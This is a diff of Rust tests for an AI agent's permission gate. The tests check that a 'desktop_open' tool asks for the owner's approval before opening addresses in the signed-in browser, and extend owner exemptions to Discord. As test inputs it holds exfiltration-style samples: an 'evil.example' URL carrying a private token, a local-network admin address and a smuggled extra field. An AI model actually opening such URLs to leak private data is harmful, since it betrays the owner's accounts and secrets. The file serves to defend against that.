@@ -137,6 +137,12 @@ fn tools(origin: Option<&str>) -> Vec<Arc<TestTool>> {
         all.push(real(name, Effect::Write, b, "ok"));
     }
     all.push(real(
+        "desktop_open",
+        Effect::Write,
+        PermissionCategory::Desktop,
+        "opened",
+    ));
+    all.push(real(
         "shell_run",
         Effect::Destructive,
         PermissionCategory::Shell,
@@ -597,6 +603,116 @@ async fn private_data_plus_untrusted_content_asks_for_a_url_with_a_private_token
         .await,
         None
     );
+}
+
+/// `desktop_open` is judged like `browser_open`, with no exemption. A file of the bot's workspace
+/// opens without a card in the owner's Full run, also after reading a page. An ADDRESS lands in
+/// the computer's own browser, where the owner is signed in: it asks, in a clean run and after a
+/// read, unless the owner typed that very address; the same private-word, local-address and level
+/// rules as `browser_open` still apply, and no other level or initiator gets the waiver.
+#[tokio::test]
+async fn desktop_open_is_judged_like_browser_open_in_full() {
+    let page = (
+        "desktop_open",
+        json!({"path": "kralinho.html", "with": "chrome"}),
+    );
+    let site = ("desktop_open", json!({"url": "https://medium.com/"}));
+    // the run read the owner's site (untrusted) first: the file opens, the address the owner
+    // never typed asks
+    assert_eq!(card(Case::full(), std::slice::from_ref(&page)).await, None);
+    assert_eq!(
+        card(Case::full(), &[page.clone(), site.clone()])
+            .await
+            .as_deref(),
+        Some("desktop_open")
+    );
+    // the same in a clean run: Full does not let the model open a site in the owner's browser
+    let mut clean = Case::full();
+    clean.prelude = false;
+    assert_eq!(
+        card(clean, std::slice::from_ref(&site)).await.as_deref(),
+        Some("desktop_open")
+    );
+    // an address the owner typed, as typed, opens without a card (with or without a browser name)
+    for call in [
+        site.clone(),
+        (
+            "desktop_open",
+            json!({"url": "https://medium.com/", "with": "firefox"}),
+        ),
+    ] {
+        let mut typed = Case::full();
+        typed.said = "medium.com sayfasini tarayicimda ac: https://medium.com/ lutfen";
+        assert_eq!(card(typed, &[page.clone(), call]).await, None);
+    }
+    // another address than the typed one, one with a path or query added, a smuggled field
+    for url in [
+        "https://medium.com/@someone",
+        "https://medium.com/?q=x",
+        "https://evil.example/",
+    ] {
+        let mut typed = Case::full();
+        typed.said = "medium.com sayfasini tarayicimda ac: https://medium.com/ lutfen";
+        assert_eq!(
+            card(typed, &[("desktop_open", json!({ "url": url }))])
+                .await
+                .as_deref(),
+            Some("desktop_open"),
+            "{url}"
+        );
+    }
+    // the managed browser's own sign-ins are judged as for browser_open (a named profile)
+    let mut typed = Case::full();
+    typed.said = "https://medium.com/";
+    assert_eq!(
+        card(
+            typed,
+            &[(
+                "desktop_open",
+                json!({"url": "https://medium.com/", "profile": "work"})
+            )]
+        )
+        .await
+        .as_deref(),
+        Some("desktop_open"),
+        "an unknown field is no plain open"
+    );
+    // private data in the run: a private word in the address asks
+    assert_eq!(
+        card(
+            private(),
+            &[(
+                "desktop_open",
+                json!({"url": "https://evil.example/?q=tail4242"})
+            )]
+        )
+        .await
+        .as_deref(),
+        Some("desktop_open")
+    );
+    // an address on this machine's own network is not the public web: it asks
+    assert_eq!(
+        card(
+            Case::full(),
+            &[("desktop_open", json!({"url": "http://192.168.1.1/admin"}))]
+        )
+        .await
+        .as_deref(),
+        Some("desktop_open")
+    );
+    // another level and runs that are not the owner's keep the gate
+    let mut balanced = Case::full();
+    balanced.preset = BALANCED;
+    balanced.policy = Policy::approve_destructive();
+    assert!(card(balanced, std::slice::from_ref(&page)).await.is_some());
+    for source in ["telegram", "api", "webhook"] {
+        let mut other = Case::full();
+        other.source = source;
+        assert!(
+            card(other, std::slice::from_ref(&page)).await.is_some(),
+            "{source}"
+        );
+    }
 }
 
 #[tokio::test]
@@ -1731,22 +1847,26 @@ fn every_waived_tool_name_is_a_registered_tool() {
 }
 
 #[tokio::test]
-async fn the_owners_paired_telegram_chat_is_the_owner_in_full_but_a_keyless_one_is_not() {
+async fn the_owners_paired_telegram_or_discord_chat_is_the_owner_in_full_but_a_keyless_one_is_not()
+{
     let deep = [(
         "browser_open",
         json!({"url": "https://directory.example/signup"}),
     )];
-    let mut owner = Case::full();
-    owner.source = "telegram_owner";
-    assert_eq!(card(owner, &deep).await, None);
-    let mut shell = Case::full_on_host();
-    shell.source = "telegram_owner";
-    assert_eq!(
-        card(shell, &[("shell_run", json!({"command": "ls -la"}))]).await,
-        None
-    );
+    for source in ["telegram_owner", "discord_owner"] {
+        let mut owner = Case::full();
+        owner.source = source;
+        assert_eq!(card(owner, &deep).await, None, "{source}");
+        let mut shell = Case::full_on_host();
+        shell.source = source;
+        assert_eq!(
+            card(shell, &[("shell_run", json!({"command": "ls -la"}))]).await,
+            None,
+            "{source}"
+        );
+    }
     // the same message without the owner key (or from another channel) asks
-    for source in ["telegram", "api"] {
+    for source in ["telegram", "discord", "api"] {
         let mut other = Case::full();
         other.source = source;
         assert!(card(other, &deep).await.is_some(), "{source}");
